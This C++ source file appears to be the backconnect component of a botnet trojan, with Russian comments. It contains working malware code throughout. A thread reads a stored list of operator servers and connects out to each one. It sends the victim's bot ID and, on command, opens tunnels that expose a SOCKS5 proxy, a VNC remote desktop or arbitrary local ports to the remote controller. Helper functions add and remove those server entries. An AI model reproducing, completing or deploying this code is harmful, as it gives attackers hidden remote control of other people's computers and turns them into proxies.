#include <windows.h>
#include <wininet.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "localconfig.h"
#include "backconnectbot.h"
#include "vnc\vncserver.h"
#include "socks5server.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\wsocket.h"
#include "..\common\backconnect.h"
#include "..\common\sync.h"
#include "..\common\process.h"

#if(BO_BCSERVER_PLATFORMS > 0)

/*
  Проверяет, ялвется список серверов валидным.

  IN list     - список.
  IN listSize - размер списка.

  Return      - true - список валидный,
                false - список не валидный.
*/
static bool isValidList(const LPSTR list, DWORD listSize)
{
  return (Str::_isValidMultiStringA(list, listSize) && (Str::_multiStringGetCountA(list) % 3) == 0);
}

//Данные бэконекта.
typedef struct
{
  LPSTR servicePort;
  LPSTR server;
  LPSTR serverPort;
  HANDLE mutex;
}BCDATA;

typedef struct
{
  BCDATA *bcData;
  DWORD servicePort;
  DWORD id;
}BCTUNNELDATA;

//Список встреоных сервисов.
#define SERVICE_PORT_SOCKS ((DWORD)-1) //Socks.
#define SERVICE_PORT_VNC   ((DWORD)-2) //VNC.

/*
  Поток для для создания тунеля.

  IN p   - BCTUNNELDATA.

  Return - 0.
*/
static DWORD WINAPI procTunnel(void *p)
{
  CoreHook::disableFileHookerForCurrentThread(true);

  BCTUNNELDATA *bcTunnelData = (BCTUNNELDATA *)p;
  SOCKET service             = INVALID_SOCKET;
  SOCKET client              = INVALID_SOCKET;
  
  WDEBUG0(WDDT_INFO, "Started.");

  //Подключаемся к сервису.
  bool ok = false;
  if(bcTunnelData->servicePort == SERVICE_PORT_SOCKS)
  {
    ok = true;
  }
# if(BO_VNC > 0)
  else if(bcTunnelData->servicePort == SERVICE_PORT_VNC)
  {
    ok = true;
  }
# endif
  else
  {
    SOCKADDR_IN addr;
    addr.sin_family           = AF_INET;
    addr.sin_port             = SWAP_WORD(bcTunnelData->servicePort);
    addr.sin_addr.S_un.S_addr = 0x0100007F; //localhost

    if((service = WSocket::tcpConnect((SOCKADDR_STORAGE *)&addr)) != INVALID_SOCKET)
    {
      WSocket::tcpDisableDelay(service, true);
      ok = true;
    }
#   if(BO_DEBUG > 0)
    else WDEBUG1(WDDT_ERROR, "Failed to connect to local IPv4 port %u.", bcTunnelData->servicePort);
#   endif
  }

  //Подключаемся к серверу.
  if(ok == true && (client = WSocket::tcpConnectA(bcTunnelData->bcData->server, (WORD)Str::_ToInt32A(bcTunnelData->bcData->serverPort, NULL))) != INVALID_SOCKET)
  {
    WSocket::tcpDisableDelay(client, true);
    WSocket::tcpSetKeepAlive(client, true, Backconnect::KEEPALIVE_DELAY, Backconnect::KEEPALIVE_INTERVAL);

    if(Backconnect::_writeCommand(client, Backconnect::COMMAND_IS_SERVICE, (LPBYTE)&bcTunnelData->id, sizeof(DWORD)))switch(bcTunnelData->servicePort)
    {
      case SERVICE_PORT_SOCKS:
        Socks5Server::_start(client, 0);
        break;

#     if(BO_VNC > 0)
      case SERVICE_PORT_VNC:
        VncServer::start(client);
        break;
#     endif
      
      default:
        WSocket::tcpTunnel(client, service);
        break;
    }      
  }
    
  //Освобождение ресурсов.
  WSocket::tcpClose(client);
  WSocket::tcpClose(service);
  Mem::free(bcTunnelData);
  
  WDEBUG0(WDDT_INFO, "Stopped.");
  return 0;
}

/*
  Поток для для создания бэконекта.

  IN p   - BCDATA.

  Return - 0.
*/
static DWORD WINAPI procConnection(void *p)
{
  CoreHook::disableFileHookerForCurrentThread(true);

  ThreadsGroup::GROUP group;
  BCDATA *bcData = (BCDATA *)p;
  
  ThreadsGroup::_createGroup(&group);
  WDEBUG0(WDDT_INFO, "Started.");

  //Получаем порт сервиса
  DWORD servicePort = 0;

  if(CWA(kernel32, lstrcmpiA)(bcData->servicePort, "socks") == 0)
  {
    servicePort = SERVICE_PORT_SOCKS;
  }
# if(BO_VNC > 0)
  else if(CWA(kernel32, lstrcmpiA)(bcData->servicePort, "vnc") == 0)
  {
    servicePort = SERVICE_PORT_VNC;
  }
# endif
  else
  {
    DWORD t = (DWORD)Str::_ToInt32A(bcData->servicePort, NULL);
    if(t > 0 && t < MAXWORD)servicePort = (WORD)t;
  }
  
  if(servicePort != 0)
  {
    //Подключаемся к серверу.
    SOCKET server = WSocket::tcpConnectA(bcData->server, (WORD)Str::_ToInt32A(bcData->serverPort, NULL));
    if(server != INVALID_SOCKET)
    {
      WDEBUG0(WDDT_INFO, "Session started.");
      WSocket::tcpDisableDelay(server, true);
      WSocket::tcpSetKeepAlive(server, true, Backconnect::KEEPALIVE_DELAY, Backconnect::KEEPALIVE_INTERVAL);
      
      //Отсылаем BotID.
      bool ok;
      {
        PESETTINGS pes;
        Str::UTF8STRING u8CompId;

        Core::getPeSettings(&pes);

        ok = Str::_utf8FromUnicode(pes.compId, -1, &u8CompId);      
        if(ok)
        {
          ok = Backconnect::_writeCommand(server, Backconnect::COMMAND_BOTID, u8CompId.data, u8CompId.size);
          Str::_utf8Free(&u8CompId);
        }
      }
      
      //Ожидаем команд от сервера.
      if(ok)
      {
        Backconnect::COMMAND bcc;
        LPBYTE bccData;

        while(WSocket::tcpWaitForEvent(&server, 1, 0, NULL, 0) == server && Backconnect::_readCommand(server, &bcc, &bccData))
        {
          //Создание тунеля.
          if(bcc.command == Backconnect::COMMAND_CONNECT && bcc.dataSize == sizeof(DWORD))
          {
            BCTUNNELDATA *bcTunnelData = (BCTUNNELDATA *)Mem::alloc(sizeof(BCTUNNELDATA));
            if(bcTunnelData != NULL)
            {
              bcTunnelData->bcData      = bcData;
              bcTunnelData->servicePort = servicePort;
              bcTunnelData->id          = *(LPDWORD)bccData;

              if(!ThreadsGroup::_createThread(&group, 128 * 1024, procTunnel, bcTunnelData, NULL, NULL))Mem::free(bcTunnelData);
            }
            ThreadsGroup::_closeTerminatedHandles(&group);
          }
          Mem::free(bccData);
        }
      }

      WDEBUG0(WDDT_INFO, "Session stopped.");
      WSocket::tcpClose(server);
    }
  }
  
  //Освобождаем ресурсы.
  ThreadsGroup::_waitForAllExit(&group, INFINITE);
  ThreadsGroup::_closeGroup(&group);

  Mem::free(bcData->servicePort);
  Mem::free(bcData->server);
  Mem::free(bcData->serverPort);
  Sync::_freeMutex(bcData->mutex);
  Mem::free(bcData);
  
  WDEBUG0(WDDT_INFO, "Stopped.");
  return 0;
}

/*
  Поток для для создания контроля бэконектов.

  Return - 0.
*/
static DWORD WINAPI proc(void *)
{
  CoreHook::disableFileHookerForCurrentThread(true);
  HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_BACKCONNECT_CONTROL, MalwareTools::KON_GLOBAL);
  if(mutex == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed");
    return 1;
  }
  
  CWA(kernel32, SetThreadPriority)(CWA(kernel32, GetCurrentThread)(), THREAD_PRIORITY_IDLE);

  WDEBUG0(WDDT_INFO, "Started.");
#if(BO_DEBUG > 0)
  if(Core::isActive())while(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 1000) == WAIT_TIMEOUT)
#else
  if(Core::isActive())while(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 60 * 1000) == WAIT_TIMEOUT)
#endif
  {
    BinStorage::STORAGE *config = LocalConfig::getCurrent();
    if(config != NULL)
    {
      DWORD itemListSize;
      LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);
        
      if(itemList != NULL && isValidList(itemList, itemListSize))
      {
        LPSTR curItem = itemList;
        do
        {
          LPSTR curServicePort = curItem;
          LPSTR curServer      = Str::_multiStringGetIndexA(curItem, 1);
          LPSTR curServerPort  = Str::_multiStringGetIndexA(curItem, 2);

          //Генерируем мютекс.
          HANDLE bcMutex = NULL;
          {
            DWORD nameParts[3];
            nameParts[0] = Crypt::crc32Hash(curServicePort, Str::_LengthA(curServicePort));
            nameParts[1] = Crypt::crc32Hash(curServer, Str::_LengthA(curServer));
            nameParts[2] = Crypt::crc32Hash(curServerPort, Str::_LengthA(curServerPort));

            WCHAR mutexName[7 + 3 * 8 + 1];
            if(Str::_sprintfW(mutexName, sizeof(mutexName) / sizeof(WCHAR), L"Global\\%08X%08X%08X", nameParts[0], nameParts[1], nameParts[2]) == sizeof(mutexName) / sizeof(WCHAR) - 1)
            {
              WDEBUG1(WDDT_INFO, "mutexName=[%s]", mutexName);
              bcMutex = Sync::_createUniqueMutex(&coreData.securityAttributes.saAllowAll, mutexName);
            }
          }

          //Создаем дочерный поток.
          if(bcMutex != NULL)
          {
            BCDATA *bcData = (BCDATA *)Mem::alloc(sizeof(BCDATA));
            if(bcData != NULL)
            {
              bcData->servicePort = Str::_CopyExA(curServicePort, -1);
              bcData->server      = Str::_CopyExA(curServer, -1);
              bcData->serverPort  = Str::_CopyExA(curServerPort, -1);
              bcData->mutex       = bcMutex;

              if(bcData->servicePort != NULL && bcData->server != NULL && bcData->serverPort != NULL)
              {
                if(Process::_createThread(512 * 1024, procConnection, bcData) > 0)continue;
              }

              Mem::free(bcData->servicePort);
              Mem::free(bcData->server);
              Mem::free(bcData->serverPort);
              Mem::free(bcData);
            }
            Sync::_freeMutex(bcMutex);
          }
        }
        while((curItem = Str::_multiStringGetIndexA(curItem, 3)) != NULL);
      }

      Mem::free(itemList);
      Mem::free(config);
    }
  }  
  
  WDEBUG0(WDDT_INFO, "Stopped.");
  Sync::_freeMutex(mutex);

  return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////

void BackconnectBot::init(void)
{


}

void BackconnectBot::uninit(void)
{

}

bool BackconnectBot::_addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort)
{
  WORD newItemSize;
  char newItem[256 * 3 + 3 + 1];

  //Генирируем элемент.
  {
    BYTE servicePortLen = (BYTE)Str::_LengthA(servicePort);
    BYTE serverLen      = (BYTE)Str::_LengthA(server);
    BYTE serverPortLen  = (BYTE)Str::_LengthA(serverPort);
    char *offset        = newItem;
    
    if(servicePortLen == 0 || serverLen == 0 || serverPortLen == 0)return false;

    newItemSize = (servicePortLen + 1) + (serverLen + 1) + (serverPortLen + 1);

    Str::_CopyA(offset, servicePort, servicePortLen);
    offset += servicePortLen + 1;

    Str::_CopyA(offset, server, serverLen);
    offset += serverLen + 1;

    Str::_CopyA(offset, serverPort, serverPortLen);
    offset += serverPortLen + 1;

    *offset = 0; //Завершающий байт мульти-строки.
    
    CWA(user32, CharLowerBuffA)(newItem, newItemSize);
  }
  
  //Открываем конфигурацию.
  BinStorage::STORAGE *config = LocalConfig::beginReadWrite();
  if(config == NULL)return false;
    
  //Получем список сущетвующих элементов.
  bool ok = true;
  DWORD itemListSize;
  LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);

  //Если элемент существует, ищим клон.
  if(isValidList(itemList, itemListSize))
  {
    LPSTR curItem = itemList;
    do
    {
      //Проверяем доступно ли места больше чем, размер искомого элемента.
      if((DWORD)((itemList + itemListSize) - curItem) <= newItemSize)break;
      
      //Сравниваем.
      if(Mem::_compare(curItem, newItem, newItemSize) == 0)
      {
        WDEBUG0(WDDT_INFO, "Item already exists.");
        ok = false;
        break;
      }
    }
    while((curItem = Str::_multiStringGetIndexA(curItem, 3)) != NULL);
    
    if(ok == true && (ok = Mem::reallocEx(&itemList, itemListSize + newItemSize)) == true)
    {
      Mem::_copy(itemList + itemListSize - 1, newItem, newItemSize + 1);
      ok = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, itemList, itemListSize + newItemSize);
    }
  }
  //Если элемент не найден, добавляем новый.
  else
  {
    if(itemList == NULL)ok = BinStorage::_addItem(&config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItem, newItemSize + 1);
    else                ok = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItem, newItemSize + 1);
  }
  Mem::free(itemList);

  if(ok == false)
  {
    Mem::free(config);
    config = NULL;
  }

  return LocalConfig::endReadWrite(config);
}

bool BackconnectBot::_removeStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort)
{
  //Загружаем конфиг.
  BinStorage::STORAGE *config = LocalConfig::beginReadWrite();
  if(config == NULL)return false;

  //Получаем список элементов.
  DWORD itemListSize;
  LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);
  
  //Элементов нет.
  if(itemList == NULL)
  {
    Mem::free(config);
    return LocalConfig::endReadWrite(NULL);
  }

  //Проверяем правильность списка.
  bool changed = false;
  if(isValidList(itemList, itemListSize))
  {
    //Создаем копию списка для копирования в него, элементов не попавших под маску.
    LPSTR newItemList = (LPSTR)Mem::alloc(itemListSize);    
    if(newItemList != NULL)  
    {
      //Ишим элементы.
      LPSTR curItem = itemList;
      LPSTR offset  = newItemList;
      int len;

      do
      {
        LPSTR curServicePort = curItem;
        LPSTR curServer      = Str::_multiStringGetIndexA(curItem, 1);
        LPSTR curServerPort  = Str::_multiStringGetIndexA(curItem, 2);

        if(Str::_matchExA(servicePort, curServicePort) && Str::_matchExA(server, curServer) && Str::_matchExA(serverPort, curServerPort))
        {
          changed = true;
        }
        else
        {
          len = Str::_LengthA(curServicePort);
          Str::_CopyA(offset, curServicePort, len);
          offset += len + 1;

          len = Str::_LengthA(curServer);
          Str::_CopyA(offset, curServer, len);
          offset += len + 1;

          len = Str::_LengthA(curServerPort);
          Str::_CopyA(offset, curServerPort, len);
          offset += len + 1;

          *offset = 0; //Завершающий байт мульти-строки.
        }
      }
      while((curItem = Str::_multiStringGetIndexA(curItem, 3)) != NULL);
      
      if(changed == true)
      {
        if(offset == newItemList)offset--; //Почти аналог BinStorage::ITEMF_COMBINE_DELETE.
        changed = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_BACKCONNECT_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItemList, offset - newItemList + 1);
      }
      Mem::free(newItemList);
    }
  }
  Mem::free(itemList);

  if(changed == false)
  {
    Mem::free(config);
    config = NULL;
  }

  return LocalConfig::endReadWrite(config);
}

bool BackconnectBot::_create(ThreadsGroup::GROUP *group)
{
  return ThreadsGroup::_createThread(group, 0, proc, NULL, NULL, NULL);
}
#endif
